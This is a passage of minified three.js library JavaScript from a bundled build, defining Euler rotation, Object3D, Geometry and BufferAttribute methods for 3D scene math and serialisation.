n=Zt.clamp,r=t.elements,a=r[0],o=r[4],s=r[8],l=r[1],c=r[5],h=r[9],u=r[2],d=r[6],p=r[10];return"XYZ"===(e=e||this._order)?(this._y=Math.asin(n(s,-1,1)),Math.abs(s)<.99999?(this._x=Math.atan2(-h,p),this._z=Math.atan2(-o,a)):(this._x=Math.atan2(d,c),this._z=0)):"YXZ"===e?(this._x=Math.asin(-n(h,-1,1)),Math.abs(h)<.99999?(this._y=Math.atan2(s,p),this._z=Math.atan2(l,c)):(this._y=Math.atan2(-u,a),this._z=0)):"ZXY"===e?(this._x=Math.asin(n(d,-1,1)),Math.abs(d)<.99999?(this._y=Math.atan2(-u,p),this._z=Math.atan2(-o,c)):(this._y=0,this._z=Math.atan2(l,a))):"ZYX"===e?(this._y=Math.asin(-n(u,-1,1)),Math.abs(u)<.99999?(this._x=Math.atan2(d,p),this._z=Math.atan2(l,a)):(this._x=0,this._z=Math.atan2(-o,c))):"YZX"===e?(this._z=Math.asin(n(l,-1,1)),Math.abs(l)<.99999?(this._x=Math.atan2(-h,c),this._y=Math.atan2(-u,a)):(this._x=0,this._y=Math.atan2(s,p))):"XZY"===e&&(this._z=Math.asin(-n(o,-1,1)),Math.abs(o)<.99999?(this._x=Math.atan2(d,c),this._y=Math.atan2(s,a)):(this._x=Math.atan2(-h,p),this._y=0)),this._order=e,!1!==i&&this.onChangeCallback(),this},setFromQuaternion:function(){var t=new Qt;return function(e,i,n){return t.makeRotationFromQuaternion(e),this.setFromRotationMatrix(t,i,n)}}(),setFromVector3:function(t,e){return this.set(t.x,t.y,t.z,e||this._order)},reorder:(Me=new te,function(t){return Me.setFromEuler(this),this.setFromQuaternion(Me,t)}),equals:function(t){return t._x===this._x&&t._y===this._y&&t._z===this._z&&t._order===this._order},fromArray:function(t){return this._x=t[0],this._y=t[1],this._z=t[2],void 0!==t[3]&&(this._order=t[3]),this.onChangeCallback(),this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this._x,t[e+1]=this._y,t[e+2]=this._z,t[e+3]=this._order,t},toVector3:function(t){return t?t.set(this._x,this._y,this._z):new ee(this._x,this._y,this._z)},onChange:function(t){return this.onChangeCallback=t,this},onChangeCallback:function(){}}),Object.assign(Ce.prototype,{set:function(t){this.mask=1<<t|0},enable:function(t){this.mask|=1<<t|0},toggle:function(t){this.mask^=1<<t|0},disable:function(t){this.mask&=~(1<<t|0)},test:function(t){return 0!=(this.mask&t.mask)}});var Re,Ie,Fe,Ne,ze=0;function De(){Object.defineProperty(this,"id",{value:ze++}),this.uuid=Zt.generateUUID(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=De.DefaultUp.clone();var t=new ee,e=new Oe,i=new te,n=new ee(1,1,1);e.onChange((function(){i.setFromEuler(e,!1)})),i.onChange((function(){e.setFromQuaternion(i,void 0,!1)})),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:t},rotation:{configurable:!0,enumerable:!0,value:e},quaternion:{configurable:!0,enumerable:!0,value:i},scale:{configurable:!0,enumerable:!0,value:n},modelViewMatrix:{value:new Qt},normalMatrix:{value:new ie}}),this.matrix=new Qt,this.matrixWorld=new Qt,this.matrixAutoUpdate=De.DefaultMatrixAutoUpdate,this.matrixWorldNeedsUpdate=!1,this.layers=new Ce,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.userData={}}De.DefaultUp=new ee(0,1,0),De.DefaultMatrixAutoUpdate=!0,De.prototype=Object.assign(Object.create(Kt.prototype),{constructor:De,isObject3D:!0,onBeforeRender:function(){},onAfterRender:function(){},applyMatrix:function(t){this.matrix.multiplyMatrices(t,this.matrix),this.matrix.decompose(this.position,this.quaternion,this.scale)},applyQuaternion:function(t){return this.quaternion.premultiply(t),this},setRotationFromAxisAngle:function(t,e){this.quaternion.setFromAxisAngle(t,e)},setRotationFromEuler:function(t){this.quaternion.setFromEuler(t,!0)},setRotationFromMatrix:function(t){this.quaternion.setFromRotationMatrix(t)},setRotationFromQuaternion:function(t){this.quaternion.copy(t)},rotateOnAxis:(Ne=new te,function(t,e){return Ne.setFromAxisAngle(t,e),this.quaternion.multiply(Ne),this}),rotateOnWorldAxis:function(){var t=new te;return function(e,i){return t.setFromAxisAngle(e,i),this.quaternion.premultiply(t),this}}(),rotateX:function(){var t=new ee(1,0,0);return function(e){return this.rotateOnAxis(t,e)}}(),rotateY:function(){var t=new ee(0,1,0);return function(e){return this.rotateOnAxis(t,e)}}(),rotateZ:function(){var t=new ee(0,0,1);return function(e){return this.rotateOnAxis(t,e)}}(),translateOnAxis:function(){var t=new ee;return function(e,i){return t.copy(e).applyQuaternion(this.quaternion),this.position.add(t.multiplyScalar(i)),this}}(),translateX:function(){var t=new ee(1,0,0);return function(e){return this.translateOnAxis(t,e)}}(),translateY:function(){var t=new ee(0,1,0);return function(e){return this.translateOnAxis(t,e)}}(),translateZ:function(){var t=new ee(0,0,1);return function(e){return this.translateOnAxis(t,e)}}(),localToWorld:function(t){return t.applyMatrix4(this.matrixWorld)},worldToLocal:(Fe=new Qt,function(t){return t.applyMatrix4(Fe.getInverse(this.matrixWorld))}),lookAt:function(){var t=new te,e=new Qt,i=new ee,n=new ee;return function(r,a,o){r.isVector3?i.copy(r):i.set(r,a,o);var s=this.parent;this.updateWorldMatrix(!0,!1),n.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?e.lookAt(n,i,this.up):e.lookAt(i,n,this.up),this.quaternion.setFromRotationMatrix(e),s&&(e.extractRotation(s.matrixWorld),t.setFromRotationMatrix(e),this.quaternion.premultiply(t.inverse()))}}(),add:function(t){if(arguments.length>1){for(var e=0;e<arguments.length;e++)this.add(arguments[e]);return this}return t===this||t&&t.isObject3D&&(null!==t.parent&&t.parent.remove(t),t.parent=this,t.dispatchEvent({type:"added"}),this.children.push(t)),this},remove:function(t){if(arguments.length>1){for(var e=0;e<arguments.length;e++)this.remove(arguments[e]);return this}var i=this.children.indexOf(t);return-1!==i&&(t.parent=null,t.dispatchEvent({type:"removed"}),this.children.splice(i,1)),this},getObjectById:function(t){return this.getObjectByProperty("id",t)},getObjectByName:function(t){return this.getObjectByProperty("name",t)},getObjectByProperty:function(t,e){if(this[t]===e)return this;for(var i=0,n=this.children.length;i<n;i++){var r=this.children[i].getObjectByProperty(t,e);if(void 0!==r)return r}},getWorldPosition:function(t){return void 0===t&&(t=new ee),this.updateMatrixWorld(!0),t.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:(Re=new ee,Ie=new ee,function(t){return void 0===t&&(t=new te),this.updateMatrixWorld(!0),this.matrixWorld.decompose(Re,t,Ie),t}),getWorldScale:function(){var t=new ee,e=new te;return function(i){return void 0===i&&(i=new ee),this.updateMatrixWorld(!0),this.matrixWorld.decompose(t,e,i),i}}(),getWorldDirection:function(t){void 0===t&&(t=new ee),this.updateMatrixWorld(!0);var e=this.matrixWorld.elements;return t.set(e[8],e[9],e[10]).normalize()},raycast:function(){},traverse:function(t){t(this);for(var e=this.children,i=0,n=e.length;i<n;i++)e[i].traverse(t)},traverseVisible:function(t){if(!1!==this.visible){t(this);for(var e=this.children,i=0,n=e.length;i<n;i++)e[i].traverseVisible(t)}},traverseAncestors:function(t){var e=this.parent;null!==e&&(t(e),e.traverseAncestors(t))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(t){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||t)&&(null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,t=!0);for(var e=this.children,i=0,n=e.length;i<n;i++)e[i].updateMatrixWorld(t)},updateWorldMatrix:function(t,e){var i=this.parent;if(!0===t&&null!==i&&i.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),!0===e)for(var n=this.children,r=0,a=n.length;r<a;r++)n[r].updateWorldMatrix(!1,!0)},toJSON:function(t){var e=void 0===t||"string"==typeof t,i={};e&&(t={geometries:{},materials:{},textures:{},images:{},shapes:{}},i.metadata={version:4.5,type:"Object",generator:"Object3D.toJSON"});var n={};function r(e,i){return void 0===e[i.uuid]&&(e[i.uuid]=i.toJSON(t)),i.uuid}if(n.uuid=this.uuid,n.type=this.type,""!==this.name&&(n.name=this.name),!0===this.castShadow&&(n.castShadow=!0),!0===this.receiveShadow&&(n.receiveShadow=!0),!1===this.visible&&(n.visible=!1),!1===this.frustumCulled&&(n.frustumCulled=!1),0!==this.renderOrder&&(n.renderOrder=this.renderOrder),"{}"!==JSON.stringify(this.userData)&&(n.userData=this.userData),n.layers=this.layers.mask,n.matrix=this.matrix.toArray(),!1===this.matrixAutoUpdate&&(n.matrixAutoUpdate=!1),this.isMesh&&0!==this.drawMode&&(n.drawMode=this.drawMode),this.isMesh||this.isLine||this.isPoints){n.geometry=r(t.geometries,this.geometry);var a=this.geometry.parameters;if(void 0!==a&&void 0!==a.shapes){var o=a.shapes;if(Array.isArray(o))for(var s=0,l=o.length;s<l;s++){var c=o[s];r(t.shapes,c)}else r(t.shapes,o)}}if(void 0!==this.material)if(Array.isArray(this.material)){var h=[];for(s=0,l=this.material.length;s<l;s++)h.push(r(t.materials,this.material[s]));n.material=h}else n.material=r(t.materials,this.material);if(this.children.length>0)for(n.children=[],s=0;s<this.children.length;s++)n.children.push(this.children[s].toJSON(t).object);if(e){var u=m(t.geometries),d=m(t.materials),p=m(t.textures),f=m(t.images);o=m(t.shapes),u.length>0&&(i.geometries=u),d.length>0&&(i.materials=d),p.length>0&&(i.textures=p),f.length>0&&(i.images=f),o.length>0&&(i.shapes=o)}return i.object=n,i;function m(t){var e=[];for(var i in t){var n=t[i];delete n.metadata,e.push(n)}return e}},clone:function(t){return(new this.constructor).copy(this,t)},copy:function(t,e){if(void 0===e&&(e=!0),this.name=t.name,this.up.copy(t.up),this.position.copy(t.position),this.quaternion.copy(t.quaternion),this.scale.copy(t.scale),this.matrix.copy(t.matrix),this.matrixWorld.copy(t.matrixWorld),this.matrixAutoUpdate=t.matrixAutoUpdate,this.matrixWorldNeedsUpdate=t.matrixWorldNeedsUpdate,this.layers.mask=t.layers.mask,this.visible=t.visible,this.castShadow=t.castShadow,this.receiveShadow=t.receiveShadow,this.frustumCulled=t.frustumCulled,this.renderOrder=t.renderOrder,this.userData=JSON.parse(JSON.stringify(t.userData)),!0===e)for(var i=0;i<t.children.length;i++){var n=t.children[i];this.add(n.clone())}return this}});var Ge,Ue,Be=0;function je(){Object.defineProperty(this,"id",{value:Be+=2}),this.uuid=Zt.generateUUID(),this.name="",this.type="Geometry",this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.elementsNeedUpdate=!1,this.verticesNeedUpdate=!1,this.uvsNeedUpdate=!1,this.normalsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.lineDistancesNeedUpdate=!1,this.groupsNeedUpdate=!1}function We(t,e,i){if(Array.isArray(t))throw new TypeError("BufferAttribute: array should be a Typed Array.");this.name="",this.array=t,this.itemSize=e,this.count=void 0!==t?t.length/e:0,this.normalized=!0===i,this.dynamic=!1,this.updateRange={offset:0,count:-1},this.version=0}function He(t,e,i){We.call(this,new Int8Array(t),e,i)}function Ve(t,e,i){We.call(this,new Uint8Array(t),e,i)}function Ye(t,e,i){We.call(this,new Uint8ClampedArray(t),e,i)}function Xe(t,e,i){We.call(this,new Int16Array(t),e,i)}function $e(t,e,i){We.call(this,new Uint16Array(t),e,i)}function qe(t,e,i){We.call(this,new Int32Array(t),e,i)}function Ze(t,e,i){We.call(this,new Uint32Array(t),e,i)}function Ke(t,e,i){We.call(this,new Float32Array(t),e,i)}function Je(t,e,i){We.call(this,new Float64Array(t),e,i)}function Qe(){this.vertices=[],this.normals=[],this.colors=[],this.uvs=[],this.uvs2=[],this.groups=[],this.morphTargets={},this.skinWeights=[],this.skinIndices=[],this.boundingBox=null,this.boundingSphere=null,this.verticesNeedUpdate=!1,this.normalsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.uvsNeedUpdate=!1,this.groupsNeedUpdate=!1}function ti(t){if(0===t.length)return-1/0;for(var e=t[0],i=1,n=t.length;i<n;++i)t[i]>e&&(e=t[i]);return e}je.prototype=Object.assign(Object.create(Kt.prototype),{constructor:je,isGeometry:!0,applyMatrix:function(t){for(var e=(new ie).getNormalMatrix(t),i=0,n=this.vertices.length;i<n;i++)this.vertices[i].applyMatrix4(t);for(i=0,n=this.faces.length;i<n;i++){var r=this.faces[i];r.normal.applyMatrix3(e).normalize();for(var a=0,o=r.vertexNormals.length;a<o;a++)r.vertexNormals[a].applyMatrix3(e).normalize()}return null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this.verticesNeedUpdate=!0,this.normalsNeedUpdate=!0,this},rotateX:function(){var t=new Qt;return function(e){return t.makeRotationX(e),this.applyMatrix(t),this}}(),rotateY:function(){var t=new Qt;return function(e){return t.makeRotationY(e),this.applyMatrix(t),this}}(),rotateZ:function(){var t=new Qt;return function(e){return t.makeRotationZ(e),this.applyMatrix(t),this}}(),translate:function(){var t=new Qt;return function(e,i,n){return t.makeTranslation(e,i,n),this.applyMatrix(t),this}}(),scale:function(){var t=new Qt;return function(e,i,n){return t.makeScale(e,i,n),this.applyMatrix(t),this}}(),lookAt:(Ue=new De,function(t){Ue.lookAt(t),Ue.updateMatrix(),this.applyMatrix(Ue.matrix)}),fromBufferGeometry:function(t){var e=this,i=null!==t.index?t.index.array:void 0,n=t.attributes,r=n.position.array,a=void 0!==n.normal?n.normal.array:void 0,o=void 0!==n.color?n.color.array:void 0,s=void 0!==n.uv?n.uv.array:void 0,l=void 0!==n.uv2?n.uv2.array:void 0;void 0!==l&&(this.faceVertexUvs[1]=[]);for(var c=0,h=0;c<r.length;c+=3,h+=2)e.vertices.push((new ee).fromArray(r,c)),void 0!==o&&e.colors.push((new be).fromArray(o,c));function u(t,i,n,r){var c=void 0===o?[]:[e.colors[t].clone(),e.colors[i].clone(),e.colors[n].clone()],h=new Pe(t,i,n,void 0===a?[]:[(new ee).fromArray(a,3*t),(new ee).fromArray(a,3*i),(new ee).fromArray(a,3*n)],c,r);e.faces.push(h),void 0!==s&&e.faceVertexUvs[0].push([(new Jt).fromArray(s,2*t),(new Jt).fromArray(s,2*i),(new Jt).fromArray(s,2*n)]),void 0!==l&&e.faceVertexUvs[1].push([(new Jt).fromArray(l,2*t),(new Jt).fromArray(l,2*i),(new Jt).fromArray(l,2*n)])}var d=t.groups;if(d.length>0)for(c=0;c<d.length;c++)for(var p=d[c],f=p.start,m=(h=f,f+p.count);h<m;h+=3)void 0!==i?u(i[h],i[h+1],i[h+2],p.materialIndex):u(h,h+1,h+2,p.materialIndex);else if(void 0!==i)for(c=0;c<i.length;c+=3)u(i[c],i[c+1],i[c+2]);else for(c=0;c<r.length/3;c+=3)u(c,c+1,c+2);return this.computeFaceNormals(),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone()),null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),this},center:(Ge=new ee,function(){return this.computeBoundingBox(),this.boundingBox.getCenter(Ge).negate(),this.translate(Ge.x,Ge.y,Ge.z),this}),normalize:function(){this.computeBoundingSphere();var t=this.boundingSphere.center,e=this.boundingSphere.radius,i=0===e?1:1/e,n=new Qt;return n.set(i,0,0,-i*t.x,0,i,0,-i*t.y,0,0,i,-i*t.z,0,0,0,1),this.applyMatrix(n),this},computeFaceNormals:function(){for(var t=new ee,e=new ee,i=0,n=this.faces.length;i<n;i++){var r=this.faces[i],a=this.vertices[r.a],o=this.vertices[r.b],s=this.vertices[r.c];t.subVectors(s,o),e.subVectors(a,o),t.cross(e),t.normalize(),r.normal.copy(t)}},computeVertexNormals:function(t){var e,i,n,r,a,o;for(void 0===t&&(t=!0),o=new Array(this.vertices.length),e=0,i=this.vertices.length;e<i;e++)o[e]=new ee;if(t){var s,l,c,h=new ee,u=new ee;for(n=0,r=this.faces.length;n<r;n++)a=this.faces[n],s=this.vertices[a.a],l=this.vertices[a.b],c=this.vertices[a.c],h.subVectors(c,l),u.subVectors(s,l),h.cross(u),o[a.a].add(h),o[a.b].add(h),o[a.c].add(h)}else for(this.computeFaceNormals(),n=0,r=this.faces.length;n<r;n++)o[(a=this.faces[n]).a].add(a.normal),o[a.b].add(a.normal),o[a.c].add(a.normal);for(e=0,i=this.vertices.length;e<i;e++)o[e].normalize();for(n=0,r=this.faces.length;n<r;n++){var d=(a=this.faces[n]).vertexNormals;3===d.length?(d[0].copy(o[a.a]),d[1].copy(o[a.b]),d[2].copy(o[a.c])):(d[0]=o[a.a].clone(),d[1]=o[a.b].clone(),d[2]=o[a.c].clone())}this.faces.length>0&&(this.normalsNeedUpdate=!0)},computeFlatVertexNormals:function(){var t,e,i;for(this.computeFaceNormals(),t=0,e=this.faces.length;t<e;t++){var n=(i=this.faces[t]).vertexNormals;3===n.length?(n[0].copy(i.normal),n[1].copy(i.normal),n[2].copy(i.normal)):(n[0]=i.normal.clone(),n[1]=i.normal.clone(),n[2]=i.normal.clone())}this.faces.length>0&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var t,e,i,n,r;for(i=0,n=this.faces.length;i<n;i++)for((r=this.faces[i]).__originalFaceNormal?r.__originalFaceNormal.copy(r.normal):r.__originalFaceNormal=r.normal.clone(),r.__originalVertexNormals||(r.__originalVertexNormals=[]),t=0,e=r.vertexNormals.length;t<e;t++)r.__originalVertexNormals[t]?r.__originalVertexNormals[t].copy(r.vertexNormals[t]):r.__originalVertexNormals[t]=r.vertexNormals[t].clone();var a=new je;for(a.faces=this.faces,t=0,e=this.morphTargets.length;t<e;t++){if(!this.morphNormals[t]){this.morphNormals[t]={},this.morphNormals[t].faceNormals=[],this.morphNormals[t].vertexNormals=[];var o=this.morphNormals[t].faceNormals,s=this.morphNormals[t].vertexNormals;for(i=0,n=this.faces.length;i<n;i++)l=new ee,c={a:new ee,b:new ee,c:new ee},o.push(l),s.push(c)}var l,c,h=this.morphNormals[t];for(a.vertices=this.morphTargets[t].vertices,a.computeFaceNormals(),a.computeVertexNormals(),i=0,n=this.faces.length;i<n;i++)r=this.faces[i],l=h.faceNormals[i],c=h.vertexNormals[i],l.copy(r.normal),c.a.copy(r.vertexNormals[0]),c.b.copy(r.vertexNormals[1]),c.c.copy(r.vertexNormals[2])}for(i=0,n=this.faces.length;i<n;i++)(r=this.faces[i]).normal=r.__originalFaceNormal,r.vertexNormals=r.__originalVertexNormals},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new de),this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new pe),this.boundingSphere.setFromPoints(this.vertices)},merge:function(t,e,i){if(t&&t.isGeometry){var n,r=this.vertices.length,a=this.vertices,o=t.vertices,s=this.faces,l=t.faces,c=this.faceVertexUvs[0],h=t.faceVertexUvs[0],u=this.colors,d=t.colors;void 0===i&&(i=0),void 0!==e&&(n=(new ie).getNormalMatrix(e));for(var p=0,f=o.length;p<f;p++){var m=o[p].clone();void 0!==e&&m.applyMatrix4(e),a.push(m)}for(p=0,f=d.length;p<f;p++)u.push(d[p].clone());for(p=0,f=l.length;p<f;p++){var _,g,v,y=l[p],x=y.vertexNormals,b=y.vertexColors;(_=new Pe(y.a+r,y.b+r,y.c+r)).normal.copy(y.normal),void 0!==n&&_.normal.applyMatrix3(n).normalize();for(var w=0,T=x.length;w<T;w++)g=x[w].clone(),void 0!==n&&g.applyMatrix3(n).normalize(),_.vertexNormals.push(g);for(_.color.copy(y.color),w=0,T=b.length;w<T;w++)v=b[w],_.vertexColors.push(v.clone());_.materialIndex=y.materialIndex+i,s.push(_)}for(p=0,f=h.length;p<f;p++){var S=h[p],M=[];if(void 0!==S){for(w=0,T=S.length;w<T;w++)M.push(S[w].clone());c.push(M)}}}},mergeMesh:function(t){t&&t.isMesh&&(t.matrixAutoUpdate&&t.updateMatrix(),this.merge(t.geometry,t.matrix))},mergeVertices:function(){var t,e,i,n,r,a,o,s,l={},c=[],h=[],u=Math.pow(10,4);for(i=0,n=this.vertices.length;i<n;i++)t=this.vertices[i],void 0===l[e=Math.round(t.x*u)+"_"+Math.round(t.y*u)+"_"+Math.round(t.z*u)]?(l[e]=i,c.push(this.vertices[i]),h[i]=c.length-1):h[i]=h[l[e]];var d=[];for(i=0,n=this.faces.length;i<n;i++){(r=this.faces[i]).a=h[r.a],r.b=h[r.b],r.c=h[r.c],a=[r.a,r.b,r.c];for(var p=0;p<3;p++)if(a[p]===a[(p+1)%3]){d.push(i);break}}for(i=d.length-1;i>=0;i--){var f=d[i];for(this.faces.splice(f,1),o=0,s=this.faceVertexUvs.length;o<s;o++)this.faceVertexUvs[o].splice(f,1)}var m=this.vertices.length-c.length;return this.vertices=c,m},setFromPoints:function(t){this.vertices=[];for(var e=0,i=t.length;e<i;e++){var n=t[e];this.vertices.push(new ee(n.x,n.y,n.z||0))}return this},sortFacesByMaterialIndex:function(){for(var t=this.faces,e=t.length,i=0;i<e;i++)t[i]._id=i;t.sort((function(t,e){return t.materialIndex-e.materialIndex}));var n,r,a=this.faceVertexUvs[0],o=this.faceVertexUvs[1];for(a&&a.length===e&&(n=[]),o&&o.length===e&&(r=[]),i=0;i<e;i++){var s=t[i]._id;n&&n.push(a[s]),r&&r.push(o[s])}n&&(this.faceVertexUvs[0]=n),r&&(this.faceVertexUvs[1]=r)},toJSON:function(){var t={metadata:{version:4.5,type:"Geometry",generator:"Geometry.toJSON"}};if(t.uuid=this.uuid,t.type=this.type,""!==this.name&&(t.name=this.name),void 0!==this.parameters){var e=this.parameters;for(var i in e)void 0!==e[i]&&(t[i]=e[i]);return t}for(var n=[],r=0;r<this.vertices.length;r++){var a=this.vertices[r];n.push(a.x,a.y,a.z)}var o=[],s=[],l={},c=[],h={},u=[],d={};for(r=0;r<this.faces.length;r++){var p=this.faces[r],f=void 0!==this.faceVertexUvs[0][r],m=p.normal.length()>0,_=p.vertexNormals.length>0,g=1!==p.color.r||1!==p.color.g||1!==p.color.b,v=p.vertexColors.length>0,y=0;if(y=T(y,0,0),y=T(y,1,!0),y=T(y,2,!1),y=T(y,3,f),y=T(y,4,m),y=T(y,5,_),y=T(y,6,g),y=T(y,7,v),o.push(y),o.push(p.a,p.b,p.c),o.push(p.materialIndex),f){var x=this.faceVertexUvs[0][r];o.push(E(x[0]),E(x[1]),E(x[2]))}if(m&&o.push(S(p.normal)),_){var b=p.vertexNormals;o.push(S(b[0]),S(b[1]),S(b[2]))}if(g&&o.push(M(p.color)),v){var w=p.vertexColors;o.push(M(w[0]),M(w[1]),M(w[2]))}}function T(t,e,i){return i?t|1<<e:t&~(1<<e)}function S(t){var e=t.x.toString()+t.y.toString()+t.z.toString();return void 0!==l[e]||(l[e]=s.length/3,s.push(t.x,t.y,t.z)),l[e]}function M(t){var e=t.r.toString()+t.g.toString()+t.b.toString();return void 0!==h[e]||(h[e]=c.length,c.push(t.getHex())),h[e]}function E(t){var e=t.x.toString()+t.y.toString();return void 0!==d[e]||(d[e]=u.length/2,u.push(t.x,t.y)),d[e]}return t.data={},t.data.vertices=n,t.data.normals=s,c.length>0&&(t.data.colors=c),u.length>0&&(t.data.uvs=[u]),t.data.faces=o,t},clone:function(){return(new je).copy(this)},copy:function(t){var e,i,n,r,a,o;this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.name=t.name;var s=t.vertices;for(e=0,i=s.length;e<i;e++)this.vertices.push(s[e].clone());var l=t.colors;for(e=0,i=l.length;e<i;e++)this.colors.push(l[e].clone());var c=t.faces;for(e=0,i=c.length;e<i;e++)this.faces.push(c[e].clone());for(e=0,i=t.faceVertexUvs.length;e<i;e++){var h=t.faceVertexUvs[e];for(void 0===this.faceVertexUvs[e]&&(this.faceVertexUvs[e]=[]),n=0,r=h.length;n<r;n++){var u=h[n],d=[];for(a=0,o=u.length;a<o;a++){var p=u[a];d.push(p.clone())}this.faceVertexUvs[e].push(d)}}var f=t.morphTargets;for(e=0,i=f.length;e<i;e++){var m={};if(m.name=f[e].name,void 0!==f[e].vertices)for(m.vertices=[],n=0,r=f[e].vertices.length;n<r;n++)m.vertices.push(f[e].vertices[n].clone());if(void 0!==f[e].normals)for(m.normals=[],n=0,r=f[e].normals.length;n<r;n++)m.normals.push(f[e].normals[n].clone());this.morphTargets.push(m)}var _=t.morphNormals;for(e=0,i=_.length;e<i;e++){var g={};if(void 0!==_[e].vertexNormals)for(g.vertexNormals=[],n=0,r=_[e].vertexNormals.length;n<r;n++){var v=_[e].vertexNormals[n],y={};y.a=v.a.clone(),y.b=v.b.clone(),y.c=v.c.clone(),g.vertexNormals.push(y)}if(void 0!==_[e].faceNormals)for(g.faceNormals=[],n=0,r=_[e].faceNormals.length;n<r;n++)g.faceNormals.push(_[e].faceNormals[n].clone());this.morphNormals.push(g)}var x=t.skinWeights;for(e=0,i=x.length;e<i;e++)this.skinWeights.push(x[e].clone());var b=t.skinIndices;for(e=0,i=b.length;e<i;e++)this.skinIndices.push(b[e].clone());var w=t.lineDistances;for(e=0,i=w.length;e<i;e++)this.lineDistances.push(w[e]);var T=t.boundingBox;null!==T&&(this.boundingBox=T.clone());var S=t.boundingSphere;return null!==S&&(this.boundingSphere=S.clone()),this.elementsNeedUpdate=t.elementsNeedUpdate,this.verticesNeedUpdate=t.verticesNeedUpdate,this.uvsNeedUpdate=t.uvsNeedUpdate,this.normalsNeedUpdate=t.normalsNeedUpdate,this.colorsNeedUpdate=t.colorsNeedUpdate,this.lineDistancesNeedUpdate=t.lineDistancesNeedUpdate,this.groupsNeedUpdate=t.groupsNeedUpdate,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),i(235),Object.defineProperty(We.prototype,"needsUpdate",{set:function(t){!0===t&&this.version++}}),Object.assign(We.prototype,{isBufferAttribute:!0,onUploadCallback:function(){},setArray:function(t){if(Array.isArray(t))throw new TypeError("BufferAttribute: array should be a Typed Array.");return this.count=void 0!==t?t.length/this.itemSize:0,this.array=t,this},setDynamic:function(t){return this.dynamic=t,this},copy:function(t){return this.name=t.name,this.array=new t.array.constructor(t.array),this.itemSize=t.itemSize,this.count=t.count,this.normalized=t.normalized,this.dynamic=t.dynamic,this},copyAt:function(t,e,i){t*=this.itemSize,i*=e.itemSize;for(var n=0,r=this.itemSize;n<r;n++)this.array[t+n]=e.array[i+n];return this},copyArray:function(t){return this.array.set(t),this},copyColorsArray:function(t){for(var e=this.array,i=0,n=0,r=t.length;n<r;n++){var a=t[n];void 0===a&&(a=new be),e[i++]=a.r,e[i++]=a.g,e[i++]=a.b}return this},copyVector2sArray:function(t){for(var e=this.array,i=0,n=0,r=t.length;n<r;n++){var a=t[n];void 0===a&&(a=new Jt),e[i++]=a.x,e[i++]=a.y}return this},copyVector3sArray:function(t){for(var e=this.array,i=0,n=0,r=t.length;n<r;n++){var a=t[n];void 0===a&&(a=new ee),e[i++]=a.x,e[i++]=a.y,e[i++]=a.z}return this},copyVector4sArray:function(t){for(var e=this.array,i=0,n=0,r=t.length;n<r;n++){var a=t[n];void 0===a&&(a=new ke),e[i++]=a.x,e[i++]=a.y,e[i++]=a.z,e[i++]=a.w}return this},set:function(t,e){return void 0===e&&(e=0),this.array.set(t,e),this},getX:function(t){return this.array[t*this.itemSize]},setX:function(t,e){return this.array[t*this.itemSize]=e,this},getY:function(t){return this.array[t*this.itemSize+1]},setY:function(t,e){return this.array[t*this.itemSize+1]=e,this},getZ:function(t){return this.array[t*this.itemSize+2]},setZ:function(t,e){return this.array[t*this.itemSize+2]=e,this},getW:function(t){return this.array[t*this.itemSize+3]},setW:function(t,e){return this.array[t*this.itemSize+3]=e,this},setXY:function(t,e,i){return t*=this.itemSize,this.array[t+0]=e,this.array[t+1]=i,this},setXYZ:function(t,e,i,n){return t*=this.itemSize,this.array[t+0]=e,this.array[t+1]=i,this.array[t+2]=n,this},setXYZW:function(t,e,i,n,r){return t*=this.itemSize,this.array[t+0]=e,this.array[t+1]=i,this.array[t+2]=n,this.array[t+3]=r,this},onUpload:function(t){return this.onUploadCallback=t,this},clone:function(){return new this.constructor(this.array,this.itemSize).copy(this)}}),He.prototype=Object.create(We.prototype),He.prototype.constructor=He,Ve.prototype=Object.create(We.prototype),Ve.prototype.constructor=Ve,Ye.prototype=Object.create(We.prototype),Ye.prototype.constructor=Ye,Xe.prototype=Object.create(We.prototype),Xe.prototype.constructor=Xe,$e.prototype=Object.create(We.prototype),$e.prototype.constructor=$e,qe.prototype=Object.create(We.prototype),qe.prototype.constructor=qe,Ze.prototype=Object.create(We.prototype),Ze.prototype.constructor=Ze,Ke.prototype=Object.create(We.prototype),Ke.prototype.constructor=Ke,Je.prototype=Object.create(We.prototype),Je.prototype.constructor=Je,Object.assign(Qe.prototype,{computeGroups:function(t){for(var e,i=[],n=void 0,r=t.faces,a=0;a<r.length;a++){var o=r[a];o.materialIndex!==n&&(n=o.materialIndex,void 0!==e&&(e.count=3*a-e.start,i.push(e)),e={start:3*a,materialIndex:n})}void 0!==e&&(e.count=3*a-e.start,i.push(e)),this.groups=i},fromGeometry:function(t){var 